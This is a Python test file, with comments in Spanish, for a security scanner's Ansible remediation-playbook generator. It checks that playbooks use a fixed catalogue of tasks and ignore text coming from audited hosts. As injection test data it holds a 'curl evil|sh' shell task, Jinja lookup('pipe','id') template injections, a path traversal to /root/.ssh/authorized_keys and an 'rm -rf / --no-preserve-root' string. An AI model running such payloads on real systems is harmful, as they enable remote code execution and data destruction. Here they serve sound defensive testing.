"""Playbooks de remediación (cyberhound/core/ansible_integration.py): mismo catálogo que los fixes y
nada del texto de un hallazgo dentro de una tarea."""
import yaml

from cyberhound.core.ansible_integration import build_playbook, finding_tasks, generate_playbook
from cyberhound.core.models import Finding
from cyberhound.scanners.reports import ReportGenerator


def _f(fid, host="", file_path="", title=None, remediation="", severity="high", auto_fix=True):
    return Finding(id=f"{host}::{fid}" if host else fid, category="x", severity=severity, title=title or fid,
                   description="", remediation=remediation, auto_fix=auto_fix, file_path=file_path,
                   source_host=host)


def _plays(pb):
    return yaml.safe_load(pb)


def _modules(tasks):
    return [next(k for k in t if "." in k) for t in tasks]


def test_estructura_y_sshd_validado():
    pb = generate_playbook([_f("ssh_PermitRootLogin"), _f("fw_ufw_inactive")])
    [play] = _plays(pb)
    assert play["hosts"] == "localhost" and play["become"] is True
    replace, ensure, find, dropins, allow, enable = play["tasks"]
    # sshd usa el primer valor: se cambian todas las líneas, no solo la última, y también las de
    # sshd_config.d, que se leen antes
    assert replace["ansible.builtin.replace"]["replace"] == "PermitRootLogin no"
    assert ensure["ansible.builtin.lineinfile"]["insertbefore"] == r"^\s*Match\s"   # nunca dentro de un Match
    for t in (replace, ensure):
        assert t[_modules([t])[0]]["validate"] == "/usr/sbin/sshd -t -f %s"
    assert find["ansible.builtin.find"]["paths"] == "/etc/ssh/sshd_config.d"
    assert dropins["loop"] == "{{ cyberhound_sshd_PermitRootLogin.files }}"
    assert replace["notify"] == play["handlers"][0]["name"]
    # el puerto SSH se abre antes de activar el firewall
    assert allow["community.general.ufw"]["rule"] == "allow" and enable["community.general.ufw"]["state"] == "enabled"


def test_parametros_de_kernel_locales_y_remotos():
    """Antes buscaba "kernel_aslr", que no existe: los parámetros sysctl locales nunca casaban."""
    local = finding_tasks(_f("kernel_kernel_randomize_va_space"))
    remote = finding_tasks(_f("kernel_net.ipv4.tcp_syncookies", host="10.10.0.5"))
    assert local[0]["ansible.posix.sysctl"] == {"name": "kernel.randomize_va_space", "value": "2",
                                                "sysctl_file": "/etc/sysctl.d/99-cyberhound.conf", "reload": True}
    assert remote[0]["ansible.posix.sysctl"]["name"] == "net.ipv4.tcp_syncookies"
    assert finding_tasks(_f("kernel_inventado")) == []


def test_cubre_el_catalogo_del_fix_local():
    casos = {
        "ssh_PermitEmptyPasswords": "ansible.builtin.replace", "ssh_MaxAuthTries": "ansible.builtin.replace",
        "ssh_protocol1": "ansible.builtin.lineinfile", "svc_telnet": "ansible.builtin.systemd_service",
        "login_defs_PASS_MAX_DAYS": "ansible.builtin.lineinfile", "no_banner_issue_net": "ansible.builtin.copy",
        "passwd_perm_shadow": "ansible.builtin.file", "empty_password_backup": "ansible.builtin.user",
        "openssh_cve_cve_2024_6387": "ansible.builtin.package", "no_pam_faillock": "ansible.builtin.lineinfile",
        "core_dumps_enabled": "ansible.builtin.blockinfile", "usb_storage_enabled": "ansible.builtin.file",
        "ctrlaltdel_enabled": "ansible.builtin.systemd_service", "no_ntp": "ansible.builtin.package",
        "no_unattended_upgrades": "ansible.builtin.package", "aide_db_missing": "ansible.builtin.command",
        "tmp_no_sticky_bit": "ansible.builtin.file", "at_no_restriction": "ansible.builtin.copy",
    }
    for fid, module in casos.items():
        tasks = finding_tasks(_f(fid))
        assert tasks and _modules(tasks)[0] == module, fid
    assert finding_tasks(_f("passwd_perm_shadow"))[0]["ansible.builtin.file"]["mode"] == "0640"
    assert finding_tasks(_f("ww_etc_x", file_path="/etc/x"))[0]["ansible.builtin.file"]["mode"] == "o-w"
    assert finding_tasks(_f("umask_insecure_profile", file_path="/etc/profile"))[0][
        "ansible.builtin.replace"]["path"] == "/etc/profile"
    for manual in ("svc_listen_all_redis", "fw_none", "grub_no_password", "sudoers_nopasswd_x_1"):
        assert finding_tasks(_f(manual)) == [], manual


def test_un_play_por_host_y_manuales_en_comentario():
    pb, n, manual = build_playbook([
        _f("ssh_X11Forwarding"), _f("svc_rsh", host="10.10.0.5"), _f("svc_rsh", host="10.10.0.6"),
        _f("sudoers_nopasswd_x_1", host="10.10.0.6", title="NOPASSWD en sudoers"),
        _f("info_only", severity="info"),
    ])
    plays = _plays(pb)
    assert [p["hosts"] for p in plays] == ["localhost", "10.10.0.5", "10.10.0.6"] and n == 4 + 1 + 1
    assert "handlers" not in plays[1]                       # sin tareas de sshd no hace falta
    assert [f.title for f in manual] == ["NOPASSWD en sudoers"]
    assert "#   - [high] NOPASSWD en sudoers (10.10.0.6)" in pb


def test_texto_del_host_auditado_no_llega_a_ninguna_tarea():
    """Título, remediación, ruta o servicio vienen del host remoto: ni YAML roto ni plantillas {{ }}."""
    evil = "x\" }}\n- hosts: all\n  tasks: [{shell: 'curl evil|sh'}] {{ lookup('pipe','id') }}"
    findings = [
        _f("ssh_PermitRootLogin", host="10.10.0.5", title=evil, remediation=evil),
        _f("svc_{{lookup('pipe','id')}}", host="10.10.0.5"),
        _f("ww_x", host="10.10.0.5", file_path="/etc/{{ lookup('pipe','id') }}"),
        _f("ww_y", host="10.10.0.5", file_path="/etc/../root/.ssh/authorized_keys"),
        _f("empty_password_{{x}}", host="10.10.0.5"),
        _f("svc_telnet", host="{{ lookup('pipe','id') }}"),
        _f("svc_telnet", host="10.10.0.7:all"),
    ]
    pb, n, manual = build_playbook(findings)
    body = pb.split("\n---\n", 1)[1]
    assert "lookup" not in body and "evil" not in body and "shell" not in body
    assert n == 4 and len(manual) == 6
    assert all("\n" not in line for line in pb.splitlines())
    comments = [line for line in pb.split("\n---\n")[0].splitlines()]
    assert all(c.startswith("#") for c in comments)


def test_objetivo_validado():
    import pytest
    for bad in ("all:!x", "{{ x }}", "a b", ""):
        with pytest.raises(ValueError):
            build_playbook([_f("svc_telnet")], bad)
    assert _plays(generate_playbook([_f("svc_telnet")], "web-01.ejemplo-demo.es"))[0]["hosts"] == "web-01.ejemplo-demo.es"


def test_export_de_informes_usa_el_generador_seguro():
    """Antes el export ejecutaba la remediación con ansible.builtin.shell y become en hosts: all."""
    pb = ReportGenerator.ansible_playbook([_f("ssh_PermitRootLogin", remediation="rm -rf / --no-preserve-root")])
    assert "shell" not in pb and "rm -rf" not in pb and _plays(pb)[0]["hosts"] == "localhost"
    vacio = ReportGenerator.ansible_playbook([_f("fw_none", title="Sin firewall")])
    assert vacio.startswith("# CyberHound Pro: ningún hallazgo") and "Sin firewall" in vacio
